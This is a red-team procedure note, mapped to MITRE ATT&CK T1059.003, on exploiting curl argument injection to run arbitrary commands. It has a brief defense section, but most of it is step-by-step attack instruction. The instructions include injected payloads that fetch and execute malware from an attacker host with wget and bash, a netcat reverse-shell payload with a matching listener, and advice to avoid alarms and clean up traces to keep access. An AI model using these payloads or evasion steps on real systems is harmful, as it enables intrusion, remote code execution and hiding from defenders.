---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter/Command-Line-Interface|T1059.003
    - Command-Line Interface]]
tags:
  - '[[tags/Argument Injection]]'
  - '[[tags/CURL]]'
  - '[[tags/Command Injection]]'
  - '[[tags/List of exposed commands]]'
commands:
  - '[[commands/curl-basic-fetch]]'
  - '[[commands/curl-download-file]]'
platforms:
  - Linux
  - macOS
tools: []
verified: true
validated: true
---

# Curl-Argument-Injection-for-Arbitrary-Command-Execution

## Summary

This procedure demonstrates how to exploit argument injection vulnerabilities in applications or scripts that invoke the curl command with unsanitized user input, allowing attackers to append malicious curl options or shell commands to execute arbitrary code on the target system. Commonly used in scenarios where user-supplied URLs or parameters are passed directly to curl without proper quoting or validation, leading to command execution, file downloads, or data exfiltration.

## Description

Curl is a widely used command-line tool for transferring data with URLs, but when integrated into scripts or applications without input sanitization, it becomes vulnerable to argument injection. For example, a script running `curl -o output.txt $user_url` allows an attacker to supply a URL like `http://example.com%20-o%20/tmp/backdoor.sh%20;wget%20http://attacker.com/malware.sh%20-O%20/tmp/malware.sh%20&&%20chmod%20+x%20/tmp/malware.sh%20&&%20/tmp/malware.sh`, injecting options to download and execute malware. This technique maps to MITRE ATT&CK's Command and Scripting Interpreter (T1059.003) under Execution (TA0002), as it leverages the shell or curl's argument parsing to run unauthorized commands. It is effective against Linux/macOS environments where curl is common in automation scripts, web apps, or CI/CD pipelines.

## Requirements

1. Access to a vulnerable application or script that invokes curl with user-controlled input (e.g., via API parameter, URL query, or form field).
2. Knowledge of the exact curl invocation syntax used in the target (e.g., position of user input in the command line).
3. Network access to the attacker-controlled server for hosting payloads (e.g., for reverse shells or file downloads).
4. Basic understanding of shell metacharacters (;, &&, |) and curl options (--output, --upload-file, etc.).

## Defense

- Validate and sanitize all user inputs before passing to system commands, using whitelisting for allowed URL patterns and escaping special characters.
- Use parameterized execution or libraries like Python's subprocess with shell=False to avoid direct shell invocation.
- Implement argument whitelisting for curl, restricting options to safe ones like -s (silent) or -L (follow redirects).
- Monitor logs for anomalous curl executions, such as unexpected file writes, network connections to unknown hosts, or command chaining via semicolons.
- Employ application-level firewalls or WAFs to detect injection patterns in inputs.

## Objectives

1. Inject malicious arguments into a curl command to execute arbitrary shell commands on the target.
2. Download and run payloads from an attacker-controlled server to achieve persistence or data exfiltration.
3. Compromise the target system by chaining injections to escalate privileges or pivot to other assets.

## Instructions

### Step 1: Identify Vulnerable Curl Invocation

**Context**: Analyze the target application or script to locate where curl is called with user input. Common in web apps handling URL parameters or download features. Use tools like static analysis or error messages to confirm the injection point.

No specific command here; review source code or test with benign inputs like `http://test.com` to observe behavior.

> If the input is not properly quoted, proceed to crafting the payload. Expected: Confirmation that user input directly influences curl arguments without escaping.

### Step 2: Test Basic Curl Functionality

**Context**: Verify the curl command works as expected with a safe input to baseline normal behavior and avoid detection.

**Command** ([[commands/curl-basic-fetch]]):
```bash
curl $_URL
```

> Fetch a harmless page like Google's homepage to confirm curl executes and outputs HTML. Replace $_URL with a controlled value like https://www.google.com. This step ensures the injection vector is active without triggering alarms.

### Step 3: Craft and Inject Malicious Arguments

**Context**: Construct a payload that appends curl options or shell commands to the user input field. For example, if the vulnerable command is `curl $user_input`, supply `http://example.com ; nc -e /bin/sh $ATTACKER_IP $ATTACKER_PORT` to chain a reverse shell.

**Command** ([[commands/curl-download-file]]):
```bash
curl -o $_OUTPUT_FILE $_URL
```

> Modify the input to inject: `http://example.com -o /tmp/payload.sh ; wget http://$ATTACKER_IP/malicious.sh -O /tmp/malicious.sh && bash /tmp/malicious.sh`. This downloads a file using the injected -o option and executes it via shell chaining. Expected: Payload downloads and runs, establishing a connection back to the attacker.

### Step 4: Verify Execution and Cleanup

**Context**: Check for successful command execution by monitoring attacker server logs or target system for indicators like new files or network connections. Clean up traces if needed to maintain access.

Use netcat or similar on attacker side: `nc -lvnp $ATTACKER_PORT` to catch the shell.

> Expected: Reverse shell or downloaded file appears on target. Success if arbitrary commands run without errors.
